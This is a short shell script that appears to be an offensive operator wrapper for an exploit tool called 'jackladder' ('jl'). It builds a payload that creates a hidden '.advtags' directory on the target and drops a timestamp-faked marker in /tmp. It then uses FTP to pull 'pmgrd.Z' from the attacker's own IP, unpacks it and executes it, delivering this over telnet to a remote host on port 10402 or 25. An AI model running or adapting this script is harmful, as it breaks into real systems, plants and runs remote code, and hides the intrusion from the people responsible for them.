#!/bin/sh
case "${#}" in
  0|1|2|4)
    echo "Usage: ${0} <rem_ip> <loc_ip> <targetdir>"
    echo " jl is assumed to be in ./jl"
    echo " e.g. ${0} dorothy $LOCALIP /usr"
    exit
    ;;
esac

REMOTEIP=$1
LOCALIP=$2
TARGETDIR=$3

if [ ! "$RA" = "" ]; then
    echo "RA=\"$RA\""
fi
if [ ! "$RP" = "" ]; then
    echo "RP=\"$RP\""
fi

echo CommandLine: ${0} ${*}

#1 on line below is for F version. Use 2 for D version
REALCMD="N=/dev/null
D=$TARGETDIR/.advtags
PATH=\$D:/bin:/usr/bin
echo \"locked\" > /tmp/.advtag_resource
touch -r $TARGETDIR /tmp/.advtag_resource 
mkdir \$D
cd \$D
ftp -in<<E >\$N 2>&1
open $LOCALIP
user anon o
bi
get pmgrd.Z
E
uncompress pmgrd.Z >\$N 2>&1
chmod +x pmgrd
pmgrd
exit 0"
export REALCMD


echo ""
echo ""
echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
echo ""
echo ""

echo "REALCMD=\"$REALCMD\""
echo ""
echo "Command about to be executed:"
echo " ./jl.command telnet $REMOTEIP $JLPORT"
echo ""
PLATFORM=`uname`
if [ "$PLATFORM" = "Linux" ]; then
  MINUSN=-n
else
  MINUSN=""
fi
echo $MINUSN "Hit enter to proceed, ^C to not: "

read junk

#now run jackladder
#cfgmgr
REMOTEPORT=10402
#mail
#REMOTEPORT=25

./jl.command telnet $REMOTEIP $REMOTEPORT
